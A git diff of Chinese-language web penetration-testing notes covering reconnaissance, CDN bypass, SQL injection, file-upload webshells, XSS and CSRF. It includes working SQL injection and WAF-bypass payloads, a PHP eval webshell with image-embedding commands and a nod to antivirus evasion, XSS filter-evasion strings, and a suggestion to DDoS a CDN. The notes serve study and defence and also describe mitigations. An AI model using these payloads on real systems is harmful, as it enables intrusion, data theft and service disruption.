@@ -60,21 +60,21 @@ graph LR
   - **社会学关联**：子公司的网站、乙方的网站（例如目标组织委托乙方设计办公系统，系统部署在乙方的服务器上，但系统内的数据都是目标组织的）
 - **小程序、APP**
 
-### 方法与工具
+### 工具
 
 - **网络空间测绘工具**：俗称”黑暗搜索引擎“，可以搜索目标的开放端口、指纹等许多网络资产信息。信息搜集阶段，可以用它查询子域名、ICP备案等
   - 国内：[鹰图平台](https://hunter.qianxin.com/)、[FOFA](https://fofa.info/)、[钟馗之眼](https://www.zoomeye.org/)、[Quake](https://quake.360.net/quake/#/index)、[微步](https://x.threatbook.cn)
   - 国外：[Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）、[VirusTotal](https://www.virustotal.com/gui/home/upload)
 - **搜索引擎**：搜索引擎可以检索目标网站公开的页面，其中除了常规页面外，还有机会找到配置文件、后台登录页面等。也有机会找到各种社会学信息，如员工的邮箱、子公司等
-- **提取链接**：`JSFinder`
+- **提取链接**：`JSFinder`，`FindSomething`
 - **子域名爆破**
 
 ### CDN绕过
 
 若网站有多个IP地址，则网站很可能使用了CDN（Content Distribution Network）。通常，CDN节点开放的端口少、防护措施强，因此要尽量绕过CDN节点寻找真实IP地址
 
-- **相关域名**：相关站点经常在同一IP段，可尝试访问其他资产的C段
-- **邮件服务**：网站发出邮件不可用CDN，可从该站点发出的邮件（比如验证邮件、RSS邮件订阅）分析
+- **相关域名**：相关站点经常在同一IP段，可尝试扫描其他资产的C段
+- **邮件服务**：网站发起请求不可用CDN，可从该站点发出的邮件（比如验证邮件、RSS邮件订阅）分析
 - **国外地址请求**：一般不会为海外地址部署CDN，从国外访问到的可能是真实地址
 - **DNS历史记录**：如[IP地址查询](https://site.ip138.com/)，找启用CDN之前的ip
 - **DDoS攻击**：打光网站CDN流量
@@ -103,13 +103,11 @@ graph LR
 
 ## 辅助信息
 
-网络上很可能有许多不在目标服务器上，却能帮助进行渗透的信息，比如百度文库有员工上传的内部资料、微信公众号文章透露了人员组成等
-
-有没有这类信息、它们有多大作用都是未知数，但不能完全忽略或是放弃寻找这些信息
+网络上很可能有许多不在目标服务器上，却能帮助进行渗透的信息，比如员工上传到百度文库的内部资料、微信公众号文章透露了人员组成等。这类信息存在与否、有多大作用都是未知数，但不能完全忽略这些信息
 
 ## 梳理资产
 
-以上方法如果找到了数量庞大的资产（这是非常有可能的！），就要从中筛选出“值得挖”的资产——当然，价值判断取决于渗透的目的，但一般来说，业务越重要、功能越多、系统越新，越有可能挖出高价值的漏洞
+以上方法如果找到了数量庞大的资产（这是非常有可能的！），就要从中筛选出“值得挖”的资产——当然，价值判断取决于渗透的目的，但一般来说，业务越重要、功能越多，越有可能挖出高价值的漏洞
 
 # Web漏洞基础
 
@@ -117,40 +115,38 @@ graph LR
 
 ### 基础
 
-1. **寻找注入点**：在文本后面加入单引号、双引号、括号、双括号，若有报错则可能存在SQL注入。所有和数据库有关的地方都可能出现注入，GET参数、POST参数、HTTP头、URL都不要错过
+1. **寻找注入点**：在文本后面加入单引号、双引号、括号、双括号，若有报错则可能存在SQL注入。所有和数据库有关的地方都可能出现注入，包括但不限于GET参数、POST参数、HTTP头、URL
 
-2. **闭合语句**：构造合法语句。例如，`id=1`能正常查询，加上单引号`id=1'`报错，尝试后发现`id=1')#`又能正常查询了,可以推测，服务器的查询语句应该类似`SELECT * FROM users WHERE id=('$id')`，`')`闭合了开括号、单引号，`#`注释了后面“多余”的`')`，下一步就可以在井号之前插入其他搜索条件，或者Union查询。闭合语句需要结合经验尝试单引号、双引号、反引号、括号等
-   - 注意，若注入点是用引号括起来的数字，比如`id='1'`，MySQL会尝试`'1'`转换为数字再查找。因此即使引号没匹配`id=('1 or 1=1')`、被转义`id='1\'`，都能看似正常的返回。不要被骗
-
+2. **闭合语句**：构造合法语句。例如，`id=1`能正常查询，加上单引号`id=1'`报错，尝试后发现`id=1')#`又能正常查询了,可以推测，服务器的查询语句应该类似`SELECT * FROM users WHERE id=('$id')`。`')`闭合了开括号、单引号，`#`注释了后面“多余”的`')`，下一步就可以在注释之前插入payload。闭合语句需要结合经验尝试单引号、双引号、反引号、括号等
+   
 3. **构造注入语句**：最基础的注入语句是Union注入，即通过联合查询获取额外信息
 
 ```sql
-SELECT * FROM users WHERE id='1' ORDER BY 4;          # 判断数据列数
-SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3;  # UNION查询
+SELECT * FROM users WHERE id='1' ORDER BY 4;          -- 判断数据列数
+SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3;  -- UNION查询
 ```
 
 4. **获取数据**：一般是先获取表名、各个表的字段名，然后爆破数据。具体方法因数据库而异，可参考Web漏洞利用部分
 
+SQL注入的大前提是服务器将攻击者控制的字符串直接拼接到SQl语句中。若后端代码使用了参数化查询，或者对用户输入强验证，就不存在SQL注入的可能性。测试时看似正常 / 异常的回显，可能是1. 有注入，代码以奇怪的方式跑起来了；2. 有注入，SQL出错，但服务器隐藏了报错信息；3. 没有注入
+
+比如注入`search='--+`，网页显示无结果，可能是payload没有正确闭合导致SQL报错，也可能是没有注入；比如`id=1 or 1=1`有结果，可能是数字注入点，SQL类型自动转换把payload转换为数字1，也可能是服务器做输入校验的时候丢弃了数字以外的部分，还可能是其他的怪东西
+
+看到“预料之外”的返回时，不要先入为主觉得注入成功了 / 失败了，要积极考虑其他可能性，想办法构造新的payload验证 / 排除这些可能性
+
 ### 盲注
 
-web应用进行数据库操作之后可能不会回显，比如只显示“查询成功”或“查询失败”，甚至连成功与否都不告诉用户。这种情况下通过注入获取信息的方法就叫盲注。参考：[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244)
+web应用进行数据库操作之后可能不会回显，比如只显示“查询成功”或“查询失败”，甚至连成功与否都不告诉用户。这种情况下通过注入获取信息的方法就叫盲注
 
 #### 布尔盲注
 
 1. 找注入点
-2. 构造条件。这个条件的真假影响回显。例如若payload`' or '1'='1`回显“查询成功”，`' or '1'='2`回显“查询失败”，这个payload就是合格的条件
+2. 构造条件。这个条件的真假影响回显。例如若payload`' or '1'='1`回显“查询成功”，`' or '1'='2`回显“查询失败”，这个payload就是合格的条件。HTTP头，如`Set-Cookie`、`Location`、状态码也有可能充当回显
 3. 将条件替换成注入的数据，例如下面的语句。替换参数，不断尝试直到爆破出整条数据
 
 ```sql
 SELECT * FROM users WHERE id='' or length(database()) < 16;
 SELECT * FROM users WHERE id='' or substr(database(), 1, 1) = 'a';
-```
-
-常用的字符串截取方法：
-
-```sql
-SELECT substr('a', 1, 1), mid('a', 1, 1), right('a', 1), left('a', 1);
-regexp, rlike, trim, insert, like;
 ```
 
 #### 延时盲注
@@ -163,7 +159,7 @@ SELECT name FROM users WHERE id='' UNION SELECT CASE WHEN (1=1) THEN sleep(5) EL
 SELECT name FROM users WHERE id='' UNION SELECT sleep(5*(1=1));
 ```
 
-网站可能禁`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法（**以下方法都要注意不要引起DOS**）：
+WAF可能过滤`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法（**以下方法都要注意不要引起DOS**）：
 
 ```sql
 SELECT benchmark(1000000, sha1('a'));    # 重复执行sha实现延时
@@ -173,7 +169,7 @@ SELECT rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状
 
 #### 报错盲注
 
-若服务器没有回显，又禁用了延时盲注的关键字，可以尝试构造SQL ERROR。查询成功、查询无结果、SQL报错可能是三套处理逻辑，只要报错的结果和另外两个有区别就能强行获得回显
+若服务器没有回显，可以尝试构造SQL ERROR。查询成功、查询无结果、SQL报错可能是三套处理逻辑，只要报错的结果和另外两个有区别就能获得回显
 
 ```sql
 SELECT exp(709 + (1=1));
@@ -210,7 +206,7 @@ SELECT * FROM users WHERE id=1; drop users();
 
 #### 二次注入
 
-例如，注册用户名`admin' -- `，注册时没有发生注入；但是当数据库读取用户名做进一步操作时，开发者有可能误以为从数据库取得的数据是干净的，没有清洗，因此引发注入。比如该用户修改密码的SQL语句可能如下，实际上修改了admin用户的密码
+例如，注册用户名`admin' -- `，注册时没有发生注入；但是当数据库读取用户名做进一步操作时，开发者有可能误以为从数据库取得的数据是干净的，没有使用参数化查询，因此引发注入。比如该用户修改密码的SQL语句可能如下，实际上修改了admin用户的密码
 
 ```sql
 UPDATE users SET pwd='pswd' WHERE name='admin' -- '
@@ -218,21 +214,9 @@ UPDATE users SET pwd='pswd' WHERE name='admin' -- '
 
 ### 防护
 
-- **预编译**、**参数化查询**：将语句和数据分离。一般是安全的，但表名、列名不能被占位符替代，如果允许拼接可能也有问题
-- **过滤**
-  - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义。本意并不是防SQL注入的，只是恰好起到了一点效果
-  - **关键字过滤**：禁用空格、引号、注释等特殊符号，禁用`UNION`等常用于渗透攻击的关键字。通常WAF会检测这些关键字并拦截
-- **内容检查**：检查参数内容，比如只允许用整数查询，或者检测到不正确日期格式就拒绝请求
-
-### 绕过
-
-编码：使用特殊编码、特殊转义方式，绕过网站的转义和关键字检查
-
-- **宽字节注入**：对于使用反斜杠（`0x5c`）转义的防护手段，可以在合适位置插入一个字节，让它“吞掉”反斜杠
-  - 若服务器使用utf-8、数据库使用GBK，注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。第一个字节可以是`0x81~0xa0, 0xa8~0xfd`的任意一个
-  - 若使用utf-8编码，注入`%c0' or 1=1`，转义后前两字节为`%c0%5c`，被当作一个字符（因为UTF-8是变长编码，用最高几个比特辨认字符使用多少字节，`%c0`前3比特为`0b110`，被当作是一个长2字节的字符，详见[维基百科](https://en.wikipedia.org/wiki/UTF-8#Description)）。一般称作**Overlong Encoding**漏洞
-- **二次编码注入**：数据可能多次解码，比如JSON将`\u0065`解码为`e`，XML将`&#101;`解码为`e`，多做一次”不必要“的编码有机会绕过关键字过滤
-- **替换符号**：逻辑绕过（尽量不用被过滤的关键字）+ 同义绕过（使用相同含义的其他写法）
+- **参数化查询**：将语句和数据分离，避免将用户输入拼接到SQL语句
+- **输入验证**：检查参数内容，只接收符合格式的数据，比如只允许整数，只允许年月日
+- **过滤**：检测特定关键字，如`union`，`or 1=1`。检测总是不全面的，前两个方法才是真正安全
 
 ## 文件上传
 
@@ -276,7 +260,7 @@ UPDATE users SET pwd='pswd' WHERE name='admin' -- '
    - PHP：`<?php @eval($_GET['cmd']); ?>`
    - aspx：`<%@ Page Language="Jscript"%>`
    - 这么直白的写法肯定会被杀毒软件发现，需要结合代码混淆实现免杀。可参考[Webshell集合](https://github.com/tennc/webshell)
-3. 将图片和代码拼接到一起。或者用Photoshop、PIL等将木马写入图片EXIF
+3. 将图片和代码拼接到一起。或者用Photoshop、PIL等工具将木马写入图片EXIF
 
 ```shell
 cat a.jpg shell.php > shell.jpg           # Linux
@@ -296,43 +280,38 @@ copy a.jpg /b + shell.php /a > shell.jpg  # Windows
 
 XSS只能影响到用户前端，无法直接作用于服务器
 
-- **反射型**：恶意代码写在URL内，如`example.com?q=<script>alert(1);</script>`，打开此链接便收到攻击。易受攻击的功能有搜索等
+- **反射型**：恶意代码写在URL内，如`example.com?q=<script>alert(1);</script>`，打开此链接便受到攻击。易受攻击的功能有搜索等
 - **存储型**：恶意代码存储在服务器中，打开对应页面便受到攻击。易受攻击的功能有评论、文章、用户个人资料等
-- **DOM型**：污染动态加载的数据，则浏览器解析数据时就会受到攻击。易受攻击的功能有前端渲染搜索、聊天等
-
-可以执行恶意代码的HTML标签有：
-
-```html
-<script>alert();</script>
-<img src="x" onerror="alert();" />
-<a href="javascript:alert();">Click Me</a>
-```
+- **DOM型**：污染动态加载的数据，如`example.com/#<script>alert(1);</alert>`，浏览器解析数据时就会受到攻击。DOM型XSS在浏览器前端完成，恶意代码没有发送到服务器，因此无法拦截。易受攻击的功能有前端渲染搜索等
 
 ### 防护
 
-- 转义
-- 输入校验
-- `httponly`
-
-### 绕过
-
-安全的转义方式（如`htmlspecialchars`）是没有办法绕过的，除非网页结构特殊（如允许用户操作`a[href]`，或者包含了一个具有XSS漏洞的网页。这两种情况可以不定义新HTML标签、不更改给现有标签的属性而实现XSS）。不过，用户输入和回显形式多样，开发者可能会误以为某些输入是安全的所以不转义，或者干脆忘记转义。渗透测试就是要寻找这些不起眼的用户输入和显示，比如HTTP头、`input[type=hidden]`等隐藏元素
-
-首先试着注入单引号、双引号、HTML标签、URI转义、HTML实体，如`1'2"<b>&#x61;&#x3a;%41</b>`如果都被转义就可以找下一个目标了
+- **转义**：将特殊符号都转义为HTML实体
+- **输入校验**：只允许符合格式的数据
+- **`HttpOnly`**、**CSP**：给Cookie设置`HttpOnly`标志、设置内容安全策略（CSP）头，攻击者即使实现XSS也更难实施恶意操作
 
 ## 跨站请求伪造（CSRF）
 
-跨站请求伪造（Cross-Site Requet Forgery，CSRF）利用用户浏览器的Cookie，以用户名义在目标网站上执行攻击操作。例如：
+跨站请求伪造（Cross-Site Requet Forgery，CSRF）利用网站同源策略缺陷，使用用户浏览器存储的Cookie伪造用户请求。例如：
 
-1. 用户登录银行网站，会话保持有效
+1. 用户登录银行网站，浏览器存储了银行网站的Cookie
 2. 用户访问攻击者的恶意页面，该页面隐藏一个自动提交的请求，如`<img src="http://bank.com/transfer?to=attacker&amount=1000 />"`
-3. 用户的浏览器自动携带Cookie发送请求，银行网站误认为是合法操作，执行转账
+3. 用户的浏览器自动携带Cookie发送请求，银行网站误认为是用户操作，执行转账
 
-防御措施通常有：
+以上攻击成功需要网站同源策略配置不当：1. `SameSite=Lax`，允许跨站GET请求；2. 可以用GET请求进行重要操作。CSRF也经常配合XSS漏洞使用，利用XSS嵌入伪造的请求
 
-- CSRF Token
-- SameSite Cookie
-- 验证Referer
+Cookie的`SameSite`属性有三种模式：
+
+- `Strict`：请求目标与当前URL一致时才会携带Cookie。也就是说跳转、后台请求都不带Cookie
+- `Lax`：跨域Get请求会携带Cookie。现代浏览器默认使用`Lax`
+- `None`：任何情况都会携带Cookie。基本见不到此模式
+
+### 防护
+
+- **验证Referer**
+- **SameSite属性**：设置`SameSite=Strict`可以完全防范。不过对用户不方便，多数时候不值得
+- **CSRF Token**：请求需要附带Token（一般用JavaScript设置，可能放在请求头或请求体）。正常会话时服务器生成Token并发给客户端；发生跨站攻击时，客户端没有收到Token，攻击者若无法预测CSRF Token就无法实现攻击
+- **用户操作确认**：要求输入验证码 / 输入密码等验证
 
 ## 远程代码执行（RCE）
 
@@ -410,93 +389,167 @@ https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5
 
 https://wiki.wgpsec.org/knowledge/web/sql_injection.html
 
-4. - 判断数据库类别：https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html
-   - 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
-   - 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，可跨库查询（一般需要较高权限）
+判断数据库类别：https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html
 
-| 表名       | 字段名                                  | 包含信息                             |
-| ---------- | --------------------------------------- | ------------------------------------ |
-| `schemata` | `schema_name`                           | 数据库名                             |
-| `tables`   | `table_name, table_schema`              | 表名，以及该表所属数据库名           |
-| `columns`  | `column_name, table_name, table_schema` | 字段名，以及该字段所属表名、数据库名 |
-
-### 绕过技巧
+### 绕过
 
 虽然写网站的程序员很少用关键字过滤（写网站的人一般用参数化查询一劳永逸；不会用参数化查询的人大概也不懂关键字过滤），但WAF等防护系统会采用特征识别危险请求。防护系统不能影响正常业务，识别的关键字肯定是有限的
 
 - [SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)
 - https://websec.readthedocs.io/zh/latest/vuln/sql/ref.html#tricks
 
+#### 关键字
+
 ```sql
--- 空格过滤：注释/**/、其他空白符。参见上面的速查表链接
--- 空格过滤：浮点数、括号、反引号（表名、列名可用反引号括起）
+-- and, or：用&&和||代替
+```
+
+
+
+#### 符号
+
+```sql
+-- 空格：用行内注释、括号、浮点数、反引号括起表名列名等代替
 SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
 
--- 引号过滤：数字绕过(例子中数字是admin的编码); and,or过滤：||, &&绕过。&记得转义成%26
+-- 引号：使用16进制数
+-- ord, ascii - 字符转编码；char - 编码转字符
+-- hex, unhex - 转16进制
 SELECT * FROM users WHERE id=-1||name=0x61646d696e;
 
 -- 函数式编程绕过各种运算符。下面例子判断database()第一个字符码值是否大于64
 SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
 
--- 闭合引号、括号绕过注释
+-- 注释：闭合引号、括号
 SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 
 -- Join查询绕过逗号
 SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
-
--- substr和mid函数用from for代替逗号
-SELECT * from users WHERE id=-1 || substr(database() from 1 for 1)='a';
 ```
 
-### MySQL
+编码
+
+混用数字和字符串时，数据库会做自动类型转换。`10='10a', 'a'=0x31`；SQL的16进制数在比较时可以自动转换为字符串
+
+#### 盲注
+
+```mysql
+SELECT substr('a', 1, 1);
+-- 同义函数：substring, mid, left, right
+-- 类似效果：regexp, rlike, trim, insert, like
+
+-- 逗号过滤
+SELECT substr('abc' from 1 for 1), trim(leading 'a' from 'abc');
+
+-- 比较
+SELECT 1 between 1 and 1;
+SELECT 'a' in ('a');
+SELECT ascii('a')-97;
+```
+
+#### 延时
+
+```sql
+SELECT sleep(1);
+SELECT BENCHMARK(10000000, sha(1));   # 重复执行sha(1)
+SELECT count(*) from tableA, tableB;  # 利用笛卡尔积
+select * from wp_user_ where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) # 利用复杂正则
+```
+
+#### 报错
+
+参考：https://www.cnblogs.com/feizianquan/p/10794681.html
+
+```sql
+SELECT updatexml(1, concat(0x7e, (select user())), 2);
+SELECT extractvalue(1, concat(0x7e, (select user())));
+SELECT count(*),concat('payload', floor(rand()*2))x from member group by x
+```
+
+### 元数据
+
+#### MySQL
 
 参考：https://www.cnblogs.com/20175211lyz/p/12358725.html
 
-**数据库名**
+版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
+
+以下数据库包含了数据库名、表名等元信息：
+
+- **`information_schema`**：包含表的定义等元数据的数据库。MySQL 5.0+支持
+- **`performance_schema`**：监控数据库管理系统运行状况的数据库。MySQL 5.7+默认启用。此数据库并不存储元数据，但开启采集器（Instrument）和消费者（Consumer）后，其收集的数据涵盖部分元数据
+- **`mysql`**：系统核心数据库，包括用户权限等。MySQL 5.6+
+- **`sys`**：对`performance_schema`的封装。MySQL 5.7.9+可以从中获取元数据
+
+| 库                   | 表                                    | 字段                         | 备注         |
+| -------------------- | ------------------------------------- | ---------------------------- | ------------ |
+| `information_schema` | `schemata`                            | `schema_name`                |              |
+|                      | `tables`                              | `table_name, table_schema`   |              |
+|                      | `columns`                             | `column_name, table_name`    | 字段名       |
+| `performance_schema` | `table_handlers`                      | `object_name, object_schema` |              |
+|                      | `objects_summary_global_by_type`      | `object_name, object_schema` |              |
+|                      | `events_statements_summary_by_digest` | `digest_text`                | 查询记录     |
+|                      | `file_instances`                      | `file_name`                  | 表的文件路径 |
+| `mysql`              | `innodb_index_stats`                  | `database_name`              |              |
+|                      | `innodb_table_stats`                  | `database_name, table_name`  |              |
+| `sys`                | `innodb_buffer_stats_by_table`        | `object_name, object_schema` |              |
+|                      | `x$innodb_buffer_stats_by_table`      | 同上                         |              |
+|                      | `schema_table_statistics`             | `table_name, table_schema`   |              |
+|                      | `x$schema_table_statistics`           | 同上                         |              |
+|                      | `io_global_by_file_by_latency`        | `file`                       | 数据记录等   |
+|                      | `statement_analysis`                  | `query`                      | 查询记录     |
+
+#### Oracle
 
 ```sql
-# MySQL
-SELECT schema_name FROM information_schema.schemata;
+SELECT banner FROM v$version;
+SELECT user FROM DUAL;
 ```
 
-**表名**
+#### MSSQL
+
+`sysobjects`
 
 ```sql
-# MySQL
-SELECT table_name FROM information_schema.tables WHERE table_schema = 'db_name';
-# MySQL 5.6+
-SELECT table_name from mysql.innodb_table_stats WHERE database_name = database();
-# MySQL 5.7.9+
-# 包含in
-SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();
-SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = database();
-SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = database();
-SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = database();
-# 不包含in
-SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = database();
-SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = database();
-SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = database();
-# 通过表文件的存储路径获取表名
-SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP database();
-SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP database();
-SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP database();
-# 通过performance schema
-SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();
+SELECT system_user, @@servername, @@version;
+WAITFOR DELAY '0:0:5';
 ```
 
-**列名**
+#### PostgreSQL
 
 ```sql
-# mysql
-SELECT column_name FROM information_schema.columns
-WHERE table_name="table" AND table_schema="db_name";
+SELECT current_database(), current_user;
+SELECT * FROM pg_tables;
+SELECT pg_sleep(5);
 ```
 
-特殊：无列名注入
+### 其他技巧
+
+#### 特殊注入点
+
+**Order By子句**：参考https://www.cnblogs.com/1ink/p/15107674.html
+
+1. 参数为数字、列名：按照指定的列排序
+2. 若参数为表达式：计算该表达式，然后按照表达式排序（比如`CHAR_LENGTH(username)`，根据名字长度排序）
+3. 注意，如果是值固定的表达式，比如`sort=2-1`或者`sort='id'`，并不会排序
+
+```sql
+# 盲注。注意if中必须用列名，不能是数字或字符串，否则就会当作值固定的表达式，不进行排序
+SELECT * FROM users ORDER BY if(1=1, id, username);
+# 不知道列名可以用报错注入或者时间盲注（不过注意，数据库可能优化掉无意义排序）
+SELECT * FROM users ORDER BY if(1=1, 1, (select * from information_schema.tables));
+SELECT * FROM users ORDER BY if(1=1, 1, sleep(1));
+# rand盲注。rand函数种子相同时排序结果相同，可以看下面的返回和order by rand(true)一不一样
+SELECT * FROM users ORDER BY rand(1=1);
+```
+
+**Limit子句**：只能用数字，不能用表达式。可以尝试拼接Procedure子句、Into File子句
+
+```sql
+SELECT * FROM users ORDER BY id LIMIT 1 procedure analyse(updatexml(1, concat(0x7e, database()), 1));
+```
+
+#### 无列名注入
 
 ```sql
 SELECT a FROM (select 1 `a`, 2 `b` union select * from `test_table`)x;
@@ -507,6 +560,71 @@ SELECT a FROM (
     union
     select * from test_table
 )x;
+```
+
+#### 宽字节注入
+
+对于使用反斜杠（`0x5c`）转义的防护手段，可以在合适位置插入一个字节，让它“吞掉”反斜杠
+
+- 若服务器使用utf-8、数据库使用GBK，注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。第一个字节可以是`0x81~0xa0, 0xa8~0xfd`的任意一个
+- 若使用utf-8编码，注入`%c0' or 1=1`，转义后前两字节为`%c0%5c`，被当作一个字符（因为UTF-8是变长编码，用最高几个比特辨认字符使用多少字节，`%c0`前3比特为`0b110`，被当作是一个长2字节的字符，详见[维基百科](https://en.wikipedia.org/wiki/UTF-8#Description)）。一般称作**Overlong Encoding**漏洞
+
+#### 二次编码注入
+
+数据可能多次解码，比如JSON将`\u0065`解码为`e`，XML将`&#101;`解码为`e`，多做一次”不必要“的编码有机会绕过关键字过滤
+
+## XSS
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+### 标签
+
+```html
+<script>alert();</script>
+<img src=# onmouseover="alert();" />
+<a href="javascript:alert();">Click Me</a>
+```
+
+```html
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">  损坏的标签
+<svg/onload=alert('XSS')>  用斜杠、`%00`代替标签内空格
+```
+
+### 编码
+
+**HTML实体**：
+
+```html
+<img src=# onerror=al&#x65;rt(1);></img>
+```
+
+**空白符**：浏览器解析Javascript时无视空白符，因此可以用空格、换行（`%0A, &#x0A;`）、回车（`%0D`）、tab（`%09`）、注释、括号等符号隔开`
+
+```html
+<img src=# onmouseover=javascript:alert/**/(1)>
+<script>((alert))&#x0A;(1);</script>
+```
+
+**字符串混淆**：可以隐藏危险字符串，配合`eval`、`window['alert']`等使用
+
+```javascript
+String.fromCharCode(88,83,83)
+f = 8680439..toString(30);  // f = 'alert'（30进制字符串）
+```
+
+
+
+### 函数
+
+```javascript
+// 同义函数
+prompt(1); confirm(1);
+// 使用函数名调用。可以结合编码等
+window['al'+'ert'](/xss/);
+top['alert'](1);
+window[8680439..toString(30)][1]
+// 其他
+[1].find(alert)
 ```
 
 ## 反序列化
